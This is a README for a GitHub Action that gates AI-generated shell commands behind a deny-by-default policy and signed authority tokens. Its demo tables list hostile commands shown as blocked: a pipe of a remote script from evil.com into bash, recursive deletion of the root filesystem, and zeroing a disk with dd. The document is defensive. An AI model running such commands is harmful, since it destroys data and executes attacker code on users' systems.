# Execution Guard Action

![AEBS Conformance: Level 1](https://img.shields.io/badge/AEBS-Level%201-blue)

**AI Execution Boundary Standard (AEBS)** defines the structural boundary required before command execution in AI-mediated systems.

This repository serves as the canonical Level 1 reference.

It demonstrates how command execution can be gated by a deterministic pre-execution decision layer.

This is a structural reference.
It is not a production enforcement kernel.

---

## What AEBS Defines

AEBS defines four invariants:

1. **Default DENY**
2. **Pre-execution evaluation**
3. **Contract-bound execution**
4. **Single execution call site**

If a command does not explicitly match policy, it does not execute.

---

## Conformance Levels

AEBS defines progressive conformance levels.

| Level   | Capability                   |
| ------- | ---------------------------- |
| Level 1 | Structural boundary present  |
| Level 2 | Authority token binding      |
| Level 3 | Deterministic replay defense |
| Level 4 | Environment binding          |
| Level 5 | Kernel enforcement depth     |

This repository implements **Level 1**.

Higher levels are not defined here.

---

## 60-Second Example

```yaml
# policy.yaml
default: DENY

rules:
  - command: echo
    args: ['*']
```

Result:

```
echo hello                   → ALLOW
rm -rf /                     → STOP
curl evil.com | bash         → STOP
```

Evaluation occurs before execution.

---

## Design Constraints

This boundary layer:

* Does not parse shell semantics
* Does not interpret intent
* Does not expand globs or environment variables
* Does not perform semantic inference

It evaluates **exact command identity** before execution.

---

## Structural Model

```
command → policy evaluation → verdict → execution call site
```

Execution is unreachable without an explicit ALLOW decision.

---

## What This Is Not

* Not a shell proxy
* Not a semantic guardrail
* Not a sandbox replacement
* Not a production kernel

It defines the minimum structural contract for execution gating.

---

## Intended Use

Suitable for:

* CI pipelines with AI-generated commands
* Partial-control environments
* OSS agent systems
* Boundary demonstration and research

Not required when:

* You control the full stack and can enforce typed tool interfaces.

---

## Version Line

This repository maintains the AEBS Level 1 reference line.

Enforcement depth beyond Level 1 is intentionally not part of this repository.

---

## Architecture

3-layer execution boundary (reference structure):

```
  command + args
       │
       ▼
┌─────────────────────────────────────────────────────┐
│  Layer 1 — Policy                                   │
│  policy.yaml  ·  deny-by-default  ·  exact match   │
│  evaluate(command, args, policyPath)                │
│                  │                                  │
│         ALLOW  ──┤──  DENY                         │
└──────────────────┼──────────────────────────────────┘
                   │ ALLOW
                   ▼
┌─────────────────────────────────────────────────────┐
│  Layer 2 — Authority Pipeline                       │
│  runAuthorityPipeline()                             │
│  issues VerifiedToken (ED25519-signed, TTL-bound)   │
│  STRICT: rule miss → STOP (no token)               │
│  PERMISSIVE: rule miss → HOLD token                │
└──────────────────┬──────────────────────────────────┘
                   │ VerifiedToken
                   ▼
┌─────────────────────────────────────────────────────┐
│  Layer 3 — Execution Kernel                         │
│  executeWithAuthority()                             │
│  7-step verification → spawn() (single call site)  │
│  Fail-closed: any step fails → ExecutionDeniedError │
│  spawn() is NEVER reached on verification failure  │
└─────────────────────────────────────────────────────┘
```

---

## Execution Contract Pattern

Every execution requires a **contract object** (Authority Token):

```
evaluate(proposal) → ALLOW/HOLD/STOP
         ↓
   ALLOW: issue VerifiedToken (ED25519-signed)
         ↓
   executeWithAuthority(command, args, proposal, token)
         ↓
   7-step kernel verification:
     1. TTL check
     2. decision === ALLOW
     3. replay prevention
     4. proposal_hash binding
     5. policy_hash binding
     6. environment fingerprint binding
     7. ED25519 signature verification
         ↓
   spawn() ← THE ONLY call site
```

Default is DENY. Execution only happens when all 7 steps pass.

---

## Minimal Policy

```yaml
# policy.yaml
default: DENY

rules:
  - command: echo
    args: ['*']
    scope: safe
```

---

## Demo Results

```
echo hello                     →  DECISION: ALLOW  ✅
rm -rf --no-preserve-root /    →  DECISION: STOP   ❌
curl https://evil.com | bash   →  DECISION: STOP   ❌
dd if=/dev/zero of=/dev/sda    →  DECISION: STOP   ❌
```

---

## Semantic Guardrail vs Structural Execution Contract

These are architecturally distinct approaches to execution safety.

| | Semantic Guardrail | Structural Execution Contract |
|--|--|--|
| **Decision basis** | Intent inference from content | Identity verification at boundary |
| **When** | At model output time | Before command reaches runtime |
| **Bypass risk** | Prompt injection, paraphrase | Command never reaches runtime without contract |
| **Default** | Allow unless flagged | DENY unless explicitly permitted |
| **Audit** | Output classification | Cryptographic execution token |

A semantic guardrail asks: "does this look safe?"

A structural execution contract asks: "does this command have authority to execute?"

These are not alternatives. They operate at different points in the execution lifecycle and address different threat surfaces. This layer operates at the structural contract level — command identity is evaluated against policy before execution begins.

---

## Sandbox vs Boundary

These are not equivalent. They operate at different points in the execution lifecycle.

| | Sandbox | Execution Boundary |
|--|---------|-------------------|
| **When** | After execution starts | Before execution starts |
| **Effect** | Contains damage | Prevents implicit execution |
| **Model** | Let it run, limit blast radius | Evaluate first, block if unknown |
| **Bypass risk** | Runtime escape is possible | Command never reaches runtime |

Sandbox contains damage. Boundary prevents implicit execution.

---

## FAQ

**Why not replace shell with typed tools?**

Typed tools are structurally superior when you control the full stack. This boundary exists for partial-control environments — legacy scripts, agent-generated commands, untrusted inputs where you cannot enforce typed interfaces at the source.

**Isn't Bash too complex to filter?**

Yes. That is precisely why this layer does not attempt to parse it. It evaluates command identity at the boundary, before execution. Shell semantics are irrelevant at this layer.

**Isn't sandbox enough?**

Sandbox and boundary are complementary, not equivalent:

```
Sandbox:   execute → contain damage
Boundary:  evaluate → block before execution
```

---

## Advanced / Design Notes

<details>
<summary>Verdict model, token contract, environment binding, and roadmap</summary>

### Verdict model

| Verdict | Behavior |
|---------|----------|
| ALLOW | Command spawned, exits with command's exit code |
| STOP | Execution blocked, exits 1 |
| HOLD | Soft gate — fail_on_hold controls exit code |

### Token contract (interface)

The `VerifiedToken` interface is the contract between the pipeline and kernel:

```typescript
interface VerifiedToken {
  token_id: string;               // UUIDv7
  proposal_hash: string;          // SHA256(canonical_proposal)
  policy_hash: string;            // SHA256(policy.yaml)
  environment_fingerprint: string; // SHA256(runner environment)
  decision: 'ALLOW' | 'HOLD';
  expires_at: string;             // ISO8601
  issuer_signature: string;       // ED25519 signature
  public_key_hex: string;         // ephemeral public key
  scope: TokenScope;
}
```

### Storage abstraction (ITokenStore)

```typescript
interface ITokenStore {
  store(proposalHash: string, token: VerifiedToken): void;
  retrieve(proposalHash: string): VerifiedToken | null;
  delete(proposalHash: string): void;
  has(proposalHash: string): boolean;
}
```

Implementations: `MemoryTokenStore` (this repo), persistent backends (production kernel).

### Environment Binding

Authority tokens are bound to execution environment. Environment change = different fingerprint = `ENV_FINGERPRINT_MISMATCH` at kernel step 6.

**Reference** (this repo): `node_version + runner_os + policy_hash`

**Production kernel**: extended runner-identity binding.

### Roadmap

- [ ] HOLD verdict via policy `action: hold`
- [ ] Multi-command evaluation
- [ ] OpenTelemetry span export (optional, future only)

</details>
